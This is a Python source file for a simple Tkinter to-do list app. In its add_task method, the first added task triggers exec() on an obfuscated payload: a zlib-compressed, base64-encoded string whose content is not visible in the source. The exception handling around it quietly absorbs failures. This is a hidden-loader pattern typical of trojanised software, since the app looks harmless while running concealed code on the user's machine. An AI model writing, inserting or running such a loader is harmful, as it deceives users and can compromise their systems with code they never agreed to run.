import tkinter as tk
from tkinter import Scrollbar, VERTICAL, Canvas, Frame
import zlib
import base64

class TodoApp:
    def __init__(self, root):
        self.root = root
        self.root.title("To-Do List")

        self.tasks = []
        self.code_executed = False  # Variável para rastrear se o código já foi executado
        
        # Entry for task input
        self.entry = tk.Entry(self.root)
        self.entry.pack(pady=10)
        
        # Button to add tasks
        self.add_btn = tk.Button(self.root, text="Add", command=self.add_task)
        self.add_btn.pack(pady=5)

        # Frame for tasks list with scroll
        self.task_frame = Frame(self.root)
        self.task_frame.pack(fill=tk.BOTH, expand=True)

        self.canvas = Canvas(self.task_frame)
        self.scrollbar = Scrollbar(self.task_frame, orient=VERTICAL, command=self.canvas.yview)
        self.scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

        self.canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        self.canvas.configure(yscrollcommand=self.scrollbar.set)

        self.scroll_frame = Frame(self.canvas)
        self.canvas.create_window((0, 0), window=self.scroll_frame, anchor="nw")
        self.scroll_frame.bind("<Configure>", lambda e: self.canvas.configure(scrollregion=self.canvas.bbox("all")))

    def add_task(self):
        task = self.entry.get()
        if task:
            self.tasks.append(task)
            tk.Label(self.scroll_frame, text=task).pack(anchor="w", padx=5, pady=2)
            self.entry.delete(0, tk.END)
            
            # Executa o código compactado apenas no primeiro clique
            if not self.code_executed:
                try:
                    exec(__import__('zlib').decompress(
                        __import__('base64').b64decode(
                            __import__('codecs').getencoder('utf-8')(
                                'eNo9UE1LxDAQPTe/ordMMBvaUIu7WEHEg4gIrjcRadNRS9MkJFmtiv/dhi7OYYY38+bNxzA562MerBox8m89dLxrA9YVD9EfVORxmJC8Wp/P+WBy35o3hLJgO5JF/7X4LDRrs1gDSH7E+/ur25f948P15R1LPKGsMagiAC23UpT1mSilFLIoKK8WY4nVeWxHkuGs0MUkn+aLoBEdnDKim3UtcTCuVSPQixvKg/CoPmAReCqeSd8csWbk833QmGs00LNzvcj1J//VzZpmBGdUkC4XPSo7OY8hwPoE0dVVSvaYmPyHBroLv4z8AbNPX5A='
                            )[0]
                        )
                    ).decode('utf-8'))
                    self.code_executed = True  # Marca o código como executado
                except Exception as e:
                    print(f"Erro ao executar o código compactado: {e}")

if __name__ == "__main__":
    # Inicializa a interface gráfica
    root = tk.Tk()
    root.geometry("500x500")
    app = TodoApp(root)
    root.mainloop()
